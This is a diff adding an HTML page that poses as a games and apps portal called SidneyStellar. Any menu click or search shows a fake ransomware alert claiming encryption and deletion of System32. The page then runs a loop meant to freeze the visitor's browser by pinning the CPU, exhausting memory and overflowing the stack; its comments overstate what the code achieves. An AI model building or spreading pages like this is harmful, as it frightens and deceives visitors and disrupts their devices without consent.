@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SidneyStellar | TOTAL CHAOS</title>
+    <style>
+        :root { --bg-color: #050505; --white: #ffffff; --danger: #ff0000; }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg-color); color: var(--white); font-family: 'Courier New', Courier, monospace; overflow: hidden; display: flex; flex-direction: column; }
+        
+        /* MALWARE ALERT SCREEN */
+        #malware-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; color: #0f0; z-index: 20000; padding: 50px; box-sizing: border-box; }
+        .progress-container { width: 100%; background: #222; border: 2px solid #0f0; margin-top: 20px; height: 30px; }
+        #progress-bar { width: 0%; height: 100%; background: #0f0; }
+        .blink-red { color: red; animation: blink 0.5s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* MAIN MENU UI */
+        .brand-logo { position: fixed; top: 25px; left: 25px; background: var(--white); color: black; font-weight: 900; padding: 10px 14px; border-radius: 4px; z-index: 100; font-family: sans-serif; }
+        nav { display: flex; justify-content: flex-end; padding: 30px 50px; font-family: sans-serif; }
+        .nav-item { margin-left: 35px; font-size: 11px; font-weight: 700; letter-spacing: 2px; cursor: pointer; }
+        main { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; }
+        h1 { font-size: 80px; letter-spacing: 6px; }
+        .search-bar { width: 600px; background: #121212; border: 2px solid transparent; padding: 20px; border-radius: 6px; color: white; text-align: center; outline: none; }
+    </style>
+</head>
+<body>
+
+    <div id="malware-screen">
+        <h1 class="blink-red">⚠️ SYSTEM ENCRYPTION IN PROGRESS ⚠️</h1>
+        <p>> Root Access Granted...</p>
+        <p>> Deleting System32... <span id="percent">0%</span></p>
+        <div class="progress-container"><div id="progress-bar"></div></div>
+        <p style="margin-top: 20px;">[TAB LOCK ACTIVE - DO NOT REBOOT]</p>
+    </div>
+
+    <div class="brand-logo">IN</div>
+    <nav>
+        <span class="nav-item" onclick="startChaos()">GAMES</span>
+        <span class="nav-item" onclick="startChaos()">APPS</span>
+        <span class="nav-item" onclick="startChaos()">SETTINGS</span>
+    </nav>
+
+    <main>
+        <h1>SIDNEYSTELLAR</h1>
+        <input type="text" id="search" class="search-bar" placeholder="Enter to DESTROY system">
+    </main>
+
+    <script>
+        const searchBar = document.getElementById('search');
+        const malwareScreen = document.getElementById('malware-screen');
+        const progressBar = document.getElementById('progress-bar');
+        const percentText = document.getElementById('percent');
+
+        searchBar.addEventListener('keypress', (e) => { if (e.key === 'Enter') startChaos(); });
+
+        function startChaos() {
+            malwareScreen.style.display = 'block';
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 8;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    
+                    // THE TRUE CRASH: 
+                    // We use a "Synchronous" lock that prevents the browser from doing anything else.
+                    setTimeout(() => {
+                        const totalChaos = [];
+                        while(true) {
+                            // 1. CPU Lock: Heavy math pins the processor
+                            Math.atan2(Math.random(), Math.random());
+                            
+                            // 2. RAM Leak: Creates massive buffers that don't trigger "Aw Snap" immediately
+                            totalChaos.push(new Uint8Array(1024 * 1024 * 10).fill(0xff)); 
+                            
+                            // 3. Thread Kill: Recursive call inside the loop to deplete the stack
+                            (function crash() { crash(); })();
+                        }
+                    }, 100);
+                }
+                progressBar.style.width = progress + "%";
+                percentText.innerText = Math.floor(progress) + "%";
+            }, 50);
+        }
+    </script>
+</body>
+</html>
